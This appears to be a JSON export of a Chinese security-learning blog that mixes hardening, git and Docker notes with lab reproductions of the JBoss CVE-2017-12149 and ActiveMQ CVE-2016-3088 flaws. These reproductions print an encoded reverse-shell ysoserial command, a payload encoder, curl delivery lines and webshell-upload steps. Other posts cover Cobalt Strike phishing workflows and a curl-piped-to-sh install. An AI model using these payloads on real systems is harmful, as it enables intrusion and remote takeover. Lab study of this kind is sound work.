1311","categories":[],"tags":[]},{"title":"","slug":"linux安全管理","date":"2024-02-26T02:25:19.038Z","updated":"2022-04-08T14:29:40.265Z","comments":true,"path":"2024/02/26/linux安全管理/","permalink":"http://example.com/2024/02/26/linux%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86/","excerpt":"","text":"Linux安全管理 禁用不适用的用户 123456cat /etc/passwdcat /etc/group加固方式：username -L user 或 passwd -l user /锁定用户username -U user 或 passwd -u user /解锁用户 用户密码策略 1234567891.检查/etc/pam.d/system-auth/etc/pam.d/passwd/etc/pam.d/common-password是否进行了口令复杂度设置password requisite pam_cracklib.so ucredit=-1 lcredit=-1 dcredit=-1 ocredit=-12./etc/login.defs中是否进行了口令周期设置 cat /etc/login.defs | grep PASS 或change -l user 加固方式 使用ssh协议 service status ssh 禁止root用户远程登录 1234567cat /etc/ssh/sshd_config | grep PermitRootLoginvi /etc/ssh/sshd_config PermitRootLogin 设置为no禁止root用户远程telnet：编辑 /etc/pam.d/login,配置auth required pam_securetty.so 设置会话超时退出 1234cat /etc/profile |grep TMOUT加固root运行， vi /etc/profile ,增加export TMOUT=600(单位秒) 设置登录失败次数并锁定 日志记录 日志远程存储 减少history命令记录 关闭不需要的服务","categories":[],"tags":[]},{"title":"","slug":"JBoss5.x6.x反序列化漏洞","date":"2024-02-26T02:25:19.028Z","updated":"2022-04-08T17:21:59.426Z","comments":true,"path":"2024/02/26/JBoss5.x6.x反序列化漏洞/","permalink":"http://example.com/2024/02/26/JBoss5.x6.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"12345678910title: 漏洞复现学习（jboss5.x/6.x）tags: - 渗透测试 - 漏洞复现 - 反序列化漏洞 - (CVE-2017-12149)categories: - 渗透测试 - 漏洞复现 - (CVE-2017-12149) JBoss 5.x&#x2F;6.x 反序列化漏洞（CVE-2017-12149）复现学习该漏洞为 Java反序列化错误类型，存在于 Jboss 的 HttpInvoker 组件中的 ReadOnlyAccessFilter 过滤器中。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，从而导致了漏洞。 漏洞概要 漏洞名称 JBOSSAS5.x&#x2F;6.x反序列化命令执行漏洞 威胁类型 远程命令执行 威胁等级 高 漏洞ID CVE-2017-12149 受影响系统及应用版本 Jboss AS 5.xJbossAS 6.x 漏洞环境1https://github.com/vulhub/vulhub/tree/master/jboss/CVE-2017-12149 初始化 1docker-compose up -d 初始化完成后访问http://your-ip:8080/即可看到JBoss默认页面。 漏洞复现该漏洞出现在/invoker/readonly请求中，服务器将用户提交的POST内容进行了Java反序列化： 编写反弹shell的命令123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;title&gt;java.lang.Runtime.exec() Payload Workarounds - @Jackson_T&lt;/title&gt; &lt;meta charset=&quot;utf-8&quot; /&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot; /&gt; &lt;!-- &lt;link rel=&quot;stylesheet&quot; href=&quot;./css/main.css&quot; type=&quot;text/css&quot; /&gt; --&gt; &lt;style&gt;body &#123; margin: 0; padding: 10px 0; text-align: center; font-family: &#x27;Ubuntu Condensed&#x27;, sans-serif; color: #585858; background-color: #fff; font-size: 13px; line-height: 1.4&#125; ::selection &#123; background: #fff2a8;&#125;pre, code &#123; font-family: &#x27;Ubuntu Mono&#x27;, &#x27;Consolas&#x27;, Monospace; font-size: 13px; background-color: #E5F5E5; color: #585858; padding-left: 0.25em; padding-right: 0.25em; /*display: block;*/&#125; #wrap &#123; margin-left: 1em; margin-right: 1em; text-align: left; font-size: 13px; line-height: 1.4&#125; #wrap &#123; width: 820px; &#125; #container &#123; float: right; width: 610px; &#125;.entry &#123; font-size: 14px; line-height: 20px; hyphens: auto; font-family: &#x27;Roboto&#x27;, sans-serif, &#x27;Inconsolata&#x27;, Monospace;&#125;&lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=&quot;wrap&quot;&gt; &lt;div id=&quot;container&quot;&gt; &lt;div class=&quot;entry&quot;&gt; &lt;article&gt; &lt;p&gt;偶尔有时命令执行有效负载&lt;code&gt;Runtime.getRuntime().exec()&lt;/code&gt;失败. 使用 web shells, 反序列化漏洞或其他向量时可能会发生这种情况.&lt;/p&gt; &lt;p&gt;有时这是因为重定向和管道字符的使用方式在正在启动的进程的上下文中没有意义. 例如 &lt;code&gt;ls &amp;gt; dir_listing&lt;/code&gt; 在shell中执行应该将当前目录的列表输出到名为的文件中 &lt;code&gt;dir_listing&lt;/code&gt;. 但是在 &lt;code&gt;exec()&lt;/code&gt; 函数的上下文中,该命令将被解释为获取 &lt;code&gt;&amp;gt;&lt;/code&gt; 和 &lt;code&gt;dir_listing&lt;/code&gt; 目录.&lt;/p&gt; &lt;p&gt;其他时候,其中包含空格的参数会被StringTokenizer类破坏.该类将空格分割为命令字符串. 那样的东西 &lt;code&gt;ls &amp;quot;My Directory&amp;quot;&lt;/code&gt; 会被解释为 &lt;code&gt;ls &#x27;&amp;quot;My&#x27; &#x27;Directory&amp;quot;&#x27;&lt;/code&gt;.&lt;/p&gt; &lt;p&gt;在Base64编码的帮助下, 下面的转换器可以帮助减少这些问题. 它可以通过调用Bash或PowerShell再次使管道和重定向更好,并且还确保参数中没有空格.&lt;/p&gt; &lt;p&gt;Input type: &lt;input type=&quot;radio&quot; id=&quot;bash&quot; name=&quot;option&quot; value=&quot;bash&quot; onclick=&quot;processInput();&quot; checked=&quot;&quot; /&gt;&lt;label for=&quot;bash&quot;&gt;Bash&lt;/label&gt; &lt;input type=&quot;radio&quot; id=&quot;powershell&quot; name=&quot;option&quot; value=&quot;powershell&quot; onclick=&quot;processInput();&quot; /&gt;&lt;label for=&quot;powershell&quot;&gt;PowerShell&lt;/label&gt; &lt;input type=&quot;radio&quot; id=&quot;python&quot; name=&quot;option&quot; value=&quot;python&quot; onclick=&quot;processInput();&quot; /&gt;&lt;label for=&quot;python&quot;&gt;Python&lt;/label&gt; &lt;input type=&quot;radio&quot; id=&quot;perl&quot; name=&quot;option&quot; value=&quot;perl&quot; onclick=&quot;processInput();&quot; /&gt;&lt;label for=&quot;perl&quot;&gt;Perl&lt;/label&gt;&lt;/p&gt; &lt;p&gt;&lt;textarea rows=&quot;10&quot; style=&quot;width: 100%; box-sizing: border-box;&quot; id=&quot;input&quot; placeholder=&quot;Type input here...&quot;&gt;&lt;/textarea&gt; &lt;textarea rows=&quot;5&quot; style=&quot;width: 100%; box-sizing: border-box;&quot; id=&quot;output&quot; onclick=&quot;this.focus(); this.select();&quot; readonly=&quot;&quot;&gt;&lt;/textarea&gt;&lt;/p&gt; &lt;script&gt; var taInput = document.querySelector(&#x27;textarea#input&#x27;); var taOutput = document.querySelector(&#x27;textarea#output&#x27;); function processInput() &#123; var option = document.querySelector(&#x27;input[name=&quot;option&quot;]:checked&#x27;).value; switch (option) &#123; case &#x27;bash&#x27;: taInput.placeholder = &#x27;Type Bash here...&#x27; taOutput.value = &#x27;bash -c &#123;echo,&#x27; + btoa(taInput.value) + &#x27;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;; break; case &#x27;powershell&#x27;: taInput.placeholder = &#x27;Type PowerShell here...&#x27; poshInput = &#x27;&#x27; for (var i = 0; i &lt; taInput.value.length; i++) &#123; poshInput += taInput.value[i] + unescape(&quot;%00&quot;); &#125; taOutput.value = &#x27;powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc &#x27; + btoa(poshInput); break; case &#x27;python&#x27;: taInput.placeholder = &#x27;Type Python here...&#x27; taOutput.value = &quot;python -c exec(&#x27;&quot; + btoa(taInput.value) + &quot;&#x27;.decode(&#x27;base64&#x27;))&quot;; break; case &#x27;perl&#x27;: taInput.placeholder = &#x27;Type Perl here...&#x27; taOutput.value = &quot;perl -MMIME::Base64 -e eval(decode_base64(&#x27;&quot; + btoa(taInput.value) + &quot;&#x27;))&quot;; break; default: taOutput.value = &#x27;&#x27; &#125; if (!taInput.value) taOutput.value = &#x27;&#x27;; &#125; taInput.addEventListener(&#x27;input&#x27;, processInput, false);&lt;/script&gt; &lt;/article&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/body&gt;&lt;/html&gt; 通过上面的html进行bash 序列化数据生成使用ysoserial来复现生成序列化数据，由于Vulhub使用的Java版本较新，所以选择使用的gadget是CommonsCollections5： 1java -jar ysoserial.jar CommonsCollections5 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE1My4xMjgvMjEgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; &gt; poc.ser 生成好的POC即为poc.ser 发送POC使用burp或者通过二进制的方式post发送攻击载荷 通过二进制POST方式发送攻击载荷到 &#x2F;invoker&#x2F;readonly 1curl http://172.18.174.198:8080/invoker/readonly --data-binary @poc.ser 通过burp 将这个文件作为POST Body发送至&#x2F;invoker&#x2F;readonly即可： JBoss反序列化工具一键检测： 攻击方式攻击者只需要构造带有需要执行Payload的ser文件，然后使用curl将二进制文件提交至目标服务器的invoker&#x2F;readonly页面中，即可执行Payload中指定的命令，获取对电脑的控制权。攻击示例代码如下： &#x2F;&#x2F;编译预置payload的java文件 javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java &#x2F;&#x2F;反弹shell的IP和端口 java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 1.1.1.1:6666 &#x2F;&#x2F;使用curl向&#x2F;invoker&#x2F;readonly提交payload curl http://192.268.197.25:8080/invoker/readonly –data-binary @ReverseShellCommonsCollectionsHashMap.ser 修复方法 不需要 http-invoker.sar 组件的用户可直接删除此组件。 添加如下代码至 http-invoker.sar 下 web.xml 的 security-constraint 标签中，对 http invoker 组件进行访问控制： &#x2F;*","categories":[],"tags":[]},{"title":"hexo+GitHub搭建博客","slug":"hexo搭建博客笔记","date":"2024-02-26T02:25:19.026Z","updated":"2022-04-08T16:54:05.356Z","comments":true,"path":"2024/02/26/hexo搭建博客笔记/","permalink":"http://example.com/2024/02/26/hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E7%AC%94%E8%AE%B0/","excerpt":"","text":"hexo和github搭建博客安装 Hexo、git Node.js 官网下载地址：https://nodejs.org/en/download/ Git 官网下载地址：https://git-scm.com/downloads 12$ npm install hexo-cli -g$ npm install hexo-deployer-git --save hexo初始化在刚才新建的文件夹里面再次新建一个 Hexo 文件夹,进入该 Hexo 文件夹右键鼠标，点击 Git Bash Here，输入以下命令，如图所示则安装成功 1hexo init 本地查看这里一定是 http://localhost:4000/ 有的浏览器默认打开的https的需要注意，显示失败 1hexo generate 1hexo server github部署仓库 注册 Github 账户：点击此处访问 Github 官网，点击 Sign Up 注册账户 创建项目代码库：点击 New repository 开始创建 配置 SSH 密钥：只有配置好 SSH 密钥后，我们才可以通过 git 操作实现本地代码库与 Github 代码库同步，在你第一次新建的文件夹里面 12$ ssh-keygen -t rsa -C &quot;your email@example.com&quot;//引号里面填写你的邮箱地址 123Generating public/private rsa key pair.Enter file in which to save the key (/c/Users/you/.ssh/id_rsa)://到这里可以直接回车将密钥按默认文件进行存储 123Enter passphrase (empty for no passphrase)://这里是要你输入密码，其实不需要输什么密码，直接回车就行Enter same passphrase again: 123456Your identification has been saved in /c/Users/you/.ssh/id_rsa.Your public key has been saved in /c/Users/you/.ssh/id_rsa.pub.The key fingerprint is:这里是各种字母数字组成的字符串，结尾是你的邮箱The key&#x27;s randomart image is:这里也是各种字母数字符号组成的字符串 可以寻找本地C盘用户下存储的.ssh下的id_rsa.pub 将自己生成的公钥id_rsa.pub内容复制添加到github 测试 输入以下命令：注意：git@github.com不要做任何更改！ 配置个人信息 12git config --global user.name &quot;此处填你的用户名&quot;git config --global user.email &quot;此处填你的邮箱&quot; 将hexo部署到github 找到自己的仓库复制ssh 1git@github.com:xxxxx/xxxxx.github.io.git 将ssh复制到本地的_config.yml 1234567# Deployment## Docs: https://hexo.io/docs/one-command-deploymentdeploy: type: git repository: git@github.com:16778738/16778738.github.io.git branch: master 在 Hexo 文件夹下分别执行以下命令 1hexo g -d 执行完之后会让你输入你的 Github 的账号和密码，如果此时报以下错误，说明你的 deployer 没有安装成功 1ERROR Deployer not found: git 需要执行以下命令再安装一次： 1npm install hexo-deployer-git --save 访问博客你的博客地址：https:&#x2F;&#x2F;你的用户名.github.io 点击此处进入 Hexo 官网的主题专栏 找到自己喜欢的，克隆他的模板 Github 上的地址 打开 Hexo 文件夹下的 themes 目 录右键 Git Bash Here，输入以下命令： 1$ git clone 此处填写你刚才复制的主题地址 等待下载完成后即可在 themes 目录下生成 hexo-theme-aero-dual 文件夹，然后打开 Hexo 文件夹下的配置文件 _config.yml ，找到关键字 theme，修改参数为：theme：hexo-theme-aero-dual （其他主题修改成相应名称即可），再次注意冒号后面有一个空格！ 123$ hexo clean //该命令的作用是清除缓存，若不输入此命令，服务器有可能更新不了主题$ hexo g -d","categories":[{"name":"hexo","slug":"hexo","permalink":"http://example.com/categories/hexo/"},{"name":"github","slug":"hexo/github","permalink":"http://example.com/categories/hexo/github/"},{"name":"博客","slug":"hexo/github/博客","permalink":"http://example.com/categories/hexo/github/%E5%8D%9A%E5%AE%A2/"}],"tags":[{"name":"hexo","slug":"hexo","permalink":"http://example.com/tags/hexo/"},{"name":"github","slug":"github","permalink":"http://example.com/tags/github/"},{"name":"博客","slug":"博客","permalink":"http://example.com/tags/%E5%8D%9A%E5%AE%A2/"}]},{"title":"git学习","slug":"git命令","date":"2024-02-26T02:25:19.024Z","updated":"2022-04-08T16:52:58.523Z","comments":true,"path":"2024/02/26/git命令/","permalink":"http://example.com/2024/02/26/git%E5%91%BD%E4%BB%A4/","excerpt":"","text":"git add . （注意后边有个 . ） 把修改的部分全部选中，你也可以不用 . ，修改那个选中哪个，一般都是全部选中的git commit -m”提交时提交的备注” 这一步是把刚才选中的东西提交到暂存区域，暂存区域是在你本地，并不在远程git push 解决完冲突之后，就需要把你的暂存区域代码提交到远程仓库了。解决冲突之后运行这一步即可，然后远程仓库就可以看到你的代码修改了git checkout -b local_branch_name origin&#x2F;remote_branch_name &#x2F;&#x2F; 在本地基于远程的 remote_barnch_name 新建一个 local_branch_name 分支git push origin local_branch_name &#x2F;&#x2F; 把本地分支推到远程 git branch –set-upstream-to&#x3D;origin&#x2F;local_branch_name &#x2F;&#x2F; 绑定远程分支 git pull –prune &#x2F;&#x2F; 拉取所有远程分支的改动，包括新创建的分支 –prune 刷新本地分支缓存，会清除掉本地已经删除的分支名称 git checkout local_branch_name &#x2F;&#x2F; 直接切换分支 git branch –set-upstream-to&#x3D;origin&#x2F;local_branch_name &#x2F;&#x2F; 分支绑定 git status 常看仓库的状态， git diff 常看git中文件的修改和改动 git init 初始化仓库，这个一般只在刚开始使用 git clone 仓库地址 本地目录 把远程仓库的代码克隆到本地 git add 把修改的文件添加到本地暂存区， git commit -m ‘提交信息’ 把本地暂存区的代码提交到本地版本仓库 git push origin 本地分支:远程分支 把本地分支推送到远程 git branch 查看本地分支列表 git branch -r 查看远程分支列表 git branch 分支名 源分支名 创建一个新分支默认是当前分支 git checkout 分支名 切换分支 git checkout -b 分支名 创建并且切换一个分支 git fetch 更新远程仓库分支信息到本地 git merge 分支名 合并指定分支到当前分支 git pull 更新分支信息并合并当前分支的源分支到当前分支 git log 查看分支的提交日志记录 gitk –all 查看提交信息","categories":[{"name":"git","slug":"git","permalink":"http://example.com/categories/git/"}],"tags":[{"name":"git","slug":"git","permalink":"http://example.com/tags/git/"}]},{"title":"FUZZ学习","slug":"fuzz","date":"2024-02-26T02:25:19.023Z","updated":"2022-04-08T16:51:51.534Z","comments":true,"path":"2024/02/26/fuzz/","permalink":"http://example.com/2024/02/26/fuzz/","excerpt":"","text":"FUZZ什么是Fuzz技术?1Fuzz是一种基于黑盒的自动化软件模糊测试技术,简单的说一种懒惰且暴力的技术融合了常见的以及精心构建的数据文本进行网站、软件安全性测试; Fuzz的核心思想: 目录Fuzz(漏洞点) 参数Fuzz(可利用参数) PayloadFuzz(bypass) 针对一部分网站可以扫描的全面，只要你的字典足够强大就可以扫描到绝大多部分的目录和文件 应用场景 爆破敏感目录 敏感文件可利用参数 fuzz参数来达到Jsonp劫持以及XSS漏洞等等; 越权验证信息 FBypass SQL injection Bypass Open redirect XSS Fuzzer 常用工具 御剑: 界面化目录和文件扫描 Dirsearch : 扫描模式和dirbuster是差不多 Nikto : 作用在于目录的爆破 wfuzz : 可以进行web应用暴力猜解，也支持对网站目录，登录信息，应用资源文件等的暴力猜解，还可以进行get及post参数的猜解，sql注入，xss漏洞的测试等。该工具所有功能都依赖于字典 burp插件CO2: Sqlmapper模块","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://example.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"","slug":"Docker01","date":"2024-02-26T02:25:19.021Z","updated":"2022-04-08T17:23:38.286Z","comments":true,"path":"2024/02/26/Docker01/","permalink":"http://example.com/2024/02/26/Docker01/","excerpt":"","text":"12345title: Docker学习笔记tags: - Dockercategories: - Docker Docker命令学习笔记构建并运行漏洞环境 1docker-compose up -d 容器列出所有的容器1docker ps -a 列出所有的容器 ID1docker ps -aq 杀死所有的容器1docker kill $(docker ps -aq) 停止所有的容器1docker stop $(docker ps -aq) 删除所有的容器1docker rm $(docker ps -aq) 停止所有异常的容器1docker ps -a | grep &quot;Exited&quot; | awk &#x27;&#123;print $1&#125;&#x27; | xargs docker stop 删除所有异常停止的容器1docker ps -a | grep &quot;Exited&quot; | awk &#x27;&#123;print $1&#125;&#x27; | xargs docker rm 镜像通过标签删除镜像通过如下两个都可以删除镜像： 1docker rmi [image] 或者： 1docker image rm [image] 支持的子命令如下： -f, -force: 强制删除镜像，即便有容器引用该镜像； -no-prune: 不要删除未带标签的父镜像； 通过 ID 删除镜像除了通过标签名称来删除镜像，我们还可以通过指定镜像 ID, 来删除镜像，如： 1docker rmi b7b28af77ffe 批量删除无 tag 标签镜像在 Docker 构建镜像过程产生的临时镜像，或者遗留下来的垃圾镜像，可以通过以下命令删除。 123docker ps -a|grep &quot;Exited&quot; | awk &#x27;&#123;print $1&#125;&#x27; | xargs docker stopdocker ps -a|grep &quot;Exited&quot; | awk &#x27;&#123;print $1&#125;&#x27; | xargs docker rmdocker images|grep none|awk &#x27;&#123;print $3&#125;&#x27;|xargs docker rmi 删除所有镜像1docker rmi $(docker images -q) 清理镜像我们在使用 Docker 一段时间后，系统一般都会残存一些临时的、没有被使用的镜像文件，可以通过以下命令进行清理： 1docker image prune 它支持的子命令有： -a, --all: 删除所有没有用的镜像，而不仅仅是临时文件； -f, --force：强制删除镜像文件，无需弹出提示确认；","categories":[],"tags":[]},{"title":"Cobalt Strike","slug":"docker","date":"2024-02-26T02:25:19.020Z","updated":"2022-04-08T16:50:45.850Z","comments":true,"path":"2024/02/26/docker/","permalink":"http://example.com/2024/02/26/docker/","excerpt":"","text":"Docker端口映射启动容器时，选择一个端口映射到容器内部开放端口上-p 小写p表示docker会选择一个具体的宿主机端口映射到容器内部开放的网络端口上。-P 大写P表示docker会随机选择一个宿主机端口映射到容器内部开放的网络端口上。 启动创建时，绑定外部的ip和端口 容器启动时可以指定通信协议，比如tcp、udp 查看容器绑定和映射的端口及Ip地址 容器启动绑定多IP和端口（跟多个-p） 容器除了在启动时添加端口映射关系，还可以通过宿主机的iptables进行nat转发，将宿主机的端口映射到容器的内部端口上，这种方式适用于容器启动时没有指定端口映射的情况！","categories":[{"name":"Docker","slug":"Docker","permalink":"http://example.com/categories/Docker/"}],"tags":[{"name":"Docker端口映射","slug":"Docker端口映射","permalink":"http://example.com/tags/Docker%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84/"},{"name":"Docker","slug":"Docker","permalink":"http://example.com/tags/Docker/"}]},{"title":"Cobalt Strike","slug":"CobaltStrike","date":"2024-02-26T02:25:19.010Z","updated":"2022-04-08T17:24:58.810Z","comments":true,"path":"2024/02/26/CobaltStrike/","permalink":"http://example.com/2024/02/26/CobaltStrike/","excerpt":"","text":"Cobalt StrikeCS是什么？ 1234567Cobalt Strike是一款渗透测试神器，常被业界人称为CS神器。Cobalt Strike已经不再使用MSF而是作为单独的平台使用，它分为客户端与服务端，服务端是一个，客户端可以有多个，可被团队进行分布式协团操作。Cobalt Strike集成了端口转发、扫描多模式端口Listener、Windows exe程序生成、Windows dll动态链接库生成、java程序生成、office宏代码生成，包括站点克隆获取浏览器的相关信息等。早期版本Cobalt Srtike依赖Metasploit框架，而现在Cobalt Strike已经不再使用MSF而是作为单独的平台使用。这个工具的社区版是大家熟知的Armitage(一个MSF的图形化界面工具)，而Cobalt Strike大家可以理解其为Armitage的商业版。 开启服务器1teamserver your_ip your_passowrd [config_file] 创建监听器 在CS客户端中打开 Cobalt Strike —》Listeners，之后点击Add，此时弹出New Listener窗口，在填写监听器的相关信息之前，需要先来了解监听器有哪些类型。 Cobalt Strike有两种类型的监听器： Beacon Beacon直译过来就是灯塔、信标、照亮指引的意思，Beacon是较为隐蔽的后渗透代理，Beacon监听器的名称例如： 1windows/beacon_http/reverse_http Foreign Foreign直译就是外部的，这里可以理解成对外监听器，这种类型的监听器主要作用是给其他的Payload提供别名，比如Metasploit 框架里的Payload，笔者个人理解Foreign监听器在一定程度上提高了CS的兼容性。 MSF 与 CS 的结合利用如果想使用MSF对目标进行漏洞利用，再通过这个漏洞来传输Beacon的话，也是可以的。 1、首先在MSF上选择攻击模块 2、接着在MSF上设置Payload为windows/meterpreter/reverse_http或者windows/meterpreter/reverse_https，这么做是因为CS的Beacon与MSF的分阶段协议是相兼容的。 3、之后在MSF中设置Payload的LHOST、LPORT为CS中Beacon的监听器IP及端口。 4、然后设置 DisablePayloadHandler 为 True，此选项会让 MSF 避免在其内起一个 handler 来服务你的 payload 连接，也就是告诉MSF说我们已经建立了监听器，不必再新建监听器了。 5、再设置 PrependMigrate 为 True，此选项让 MSF 前置 shellcode 在另一个进程中运行 payload stager。如果被利用的应用程序崩溃或被用户关闭，这会帮助 Beacon 会话存活。 6、最后运行exploit -j，-j 是指作为job开始运行，即在后台运行。 鱼叉式网络钓鱼用CS进行钓鱼需要四个步骤： 1、创建一个目标清单 2、制作一个邮件模板或者使用之前制作好的模板 3、选择一个用来发送邮件的邮件服务器 4、发送邮件","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"内网安全","slug":"渗透测试/内网安全","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"Cobalt Strike","slug":"Cobalt-Strike","permalink":"http://example.com/tags/Cobalt-Strike/"},{"name":"工具","slug":"工具","permalink":"http://example.com/tags/%E5%B7%A5%E5%85%B7/"}]},{"title":"","slug":"ActiveMQ任意文件写入","date":"2024-02-26T02:25:19.004Z","updated":"2022-04-08T17:23:01.297Z","comments":true,"path":"2024/02/26/ActiveMQ任意文件写入/","permalink":"http://example.com/2024/02/26/ActiveMQ%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/","excerpt":"","text":"1234567891011title: 漏洞复现学习(ActiveMQ)tags: - 渗透测试 - 漏洞复现 - ActiveMQ - (CVE-2016-3088)categories: - 渗透测试 - ActiveMQ - 漏洞复现 - (CVE-2016-3088) ActiveMQ任意文件写入漏洞 (CVE-2016-3088)学习漏洞描述 影响版本：Apache ActiveMQ 5.x~5.14.0 漏洞产生原因：ActiveMQ的web控制台分三个应用，admin、api和fileserver，其中admin是管理员页面，api是接口，fileserver是储存文件的接口；admin和api都需要登录后才能使用，fileserver无需登录。本漏洞出现在fileserver应用中，漏洞原理其实非常简单，就是fileserver支持写入文件（但不解析jsp），同时支持移动文件（MOVE请求）。所以，我们只需要写入一个文件，然后使用MOVE请求将其移动到任意位置，造成任意文件写入漏洞。 环境部署使用win10子系统的Ubuntu安装docker 查看版本信息 1http://host:8161/admin/index.jsp?printable=true 漏洞利用 首先访问网址查看ActiveMQ的绝对路径： 1http://127.0.0.1:8161/admin/test/systemProperties.jsp 然后使用burp进行put，webshell get访问&#x2F;fileserver&#x2F;3.txt，将burp拦截的请求进行重构repeater 替换信息，写入有webshell的txt文本 移动到web目录下的api文件夹（/opt/activemq/webapps/api/s.jsp）中： 1Destination:file:///opt/activemq/webapps/api/5.jsp 网站进行访问查看api&#x2F;下是否存在webshell 进行访问： 修复方案1、ActiveMQ Fileserver 的功能在 5.14.0 及其以后的版本中已被移除。建议用户升级至 5.14.0 及其以后版本。 2、通过移除 conf\\jetty.xml 的以下配置来禁用 ActiveMQ Fileserver 功能 3、打补丁 http://activemq.apache.org/security-advisories.data/CVE-2016-3088-announcement.txt 4、电脑管家等修复漏洞工具","categories":[],"tags":[]},{"title":"","slug":"青龙学习","date":"2024-02-26T01:22:49.805Z","updated":"2024-03-15T08:06:19.330Z","comments":true,"path":"2024/02/26/青龙学习/","permalink":"http://example.com/2024/02/26/%E9%9D%92%E9%BE%99%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"青龙部署12345678910111213141516171819202122232425安装拉取青龙镜像的docker pull whyour/qinglong:latest输入 docker ps查看 青龙 Docker 是否正常运行，记下青龙 Docker的容器名字 ，然后进入下一步。Docker输入一键安装命令，如果你的青龙容器不叫 qinglong，需要替换为相应的容器名字（国外鸡，可以使用上面的国外脚本，速度比较快）： docker exec -it qinglong bash -c &quot;$(curl -fsSL https://ghproxy.com/https://raw.githubusercontent.com/FlechazoPh/QLDependency/main/Shell/QLOneKeyDependency.sh | sh)&quot;查看输出日志： SSH等进度条走完，等待的时候因机器性能而异，性能差有的时间可能会非常长...npm最后输出，就完成了，重启下青龙 Docker ：Docker restart qinglong依赖安装完毕...","categories":[],"tags":[]},{"title":"","slug":"Web指纹识别技术研究与优化实现","date":"2024-02-26T01:22:49.790Z","updated":"2021-08-20T03:31:59.000Z","comments":true,"path":"2024/02/26/Web指纹识别技术研究与优化实现/","permalink":"http://example.com/2024/02/26/Web%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6%E4%B8%8E%E4%BC%98%E5%8C%96%E5%AE%9E%E7%8E%B0/","excerpt":"","text":"本文作者：TIde安全团队重剑无锋，转载请申明出处。https://github.com/TideSec/TideFinger 本文通过分析web指纹的检测对象、检测方法、检测原理及常用工具，设计了一个简易的指纹搜集脚本来协助发现新指纹，并提取了多个开源指纹识别工具的规则库并进行了规则重组，开发了一个简单快捷的指纹识别小工具TideFinger，并实现了一套在线的指纹识别平台“潮汐指纹”，希望能为大家带来方便。 前言在web渗透过程中，Web指纹识别是信息收集环节中一个比较重要的步骤，通过一些开源的工具、平台或者手工检测CMS系统是公开的CMS程序还是二次开发至关重要，能准确的获取CMS类型、Web服务组件类型及版本信息可以帮助安全工程师快速有效的去验证已知漏洞。 1在指纹识别的学习过程中，借用了很多开源的工具和指纹库，如fofa、WhatWeb、w11scan、WebEye、御剑等等，在此感谢各种大佬的无私奉献。本文并无技术上的创新和突破，只是把一些指纹库重新进行了整合和梳理并进行了开源。 tips：文末有福利我们将搜集到的一些指纹工具、指纹库等资料打包供大家下载 常见指纹检测的对象1、CMS信息：比如大汉CMS、织梦、帝国CMS、phpcms、ecshop等； 2、前端技术：比如HTML5、jquery、bootstrap、pure、ace等； 3、Web服务器：比如Apache、lighttpd, Nginx, IIS等； 4、应用服务器：比如Tomcat、Jboss、weblogic、websphere等； 5、开发语言：比如PHP、Java、Ruby、Python、C#等； 6、操作系统信息：比如linux、win2k8、win7、kali、centos等； 7、CDN信息：是否使用CDN，如cloudflare、360cdn、365cyd、yunjiasu等； 8、WAF信息：是否使用waf，如Topsec、Jiasule、Yundun等； 9、IP及域名信息：IP和域名注册信息、服务商信息等； 10、端口信息：有些软件或平台还会探测服务器开放的常见端口。 常见的指纹识别方式1、特定文件的MD5 一些网站的特定图片文件、js文件、CSS等静态文件，如favicon.ico、css、logo.ico、js等文件一般不会修改，通过爬虫对这些文件进行抓取并比对md5值，如果和规则库中的Md5一致则说明是同一CMS。这种方式速度比较快，误报率相对低一些，但也不排除有些二次开发的CMS会修改这些文件。 2、正常页面或错误网页中包含的关键字 先访问首页或特定页面如robots.txt等，通过正则的方式去匹配某些关键字，如Powered by Discuz、dedecms等。 或者可以构造错误页面，根据报错信息来判断使用的CMS或者中间件信息，比较常见的如tomcat的报错页面。 3、请求头信息的关键字匹配 根据网站response返回头信息进行关键字匹配，whatweb和Wappalyzer就是通过banner信息来快速识别指纹，之前fofa的web指纹库很多都是使用的这种方法，效率非常高，基本请求一次就可以，但搜集这些规则可能会耗时很长。而且这些banner信息有些很容易被改掉。 根据response header一般有以下几种识别方式： 查看http响应报头的X-Powered-By字段来识别； 根据Cookies来进行判断，比如一些waf会在返回头中包含一些信息，如360wzws、Safedog、yunsuo等； 根据header中的Server信息来判断，如DVRDVS-Webs、yunjiasu-nginx、Mod_Security、nginx-wallarm等； 根据WWW-Authenticate进行判断，一些路由交换设备可能存在这个字段，如NETCORE、huawei、h3c等设备。 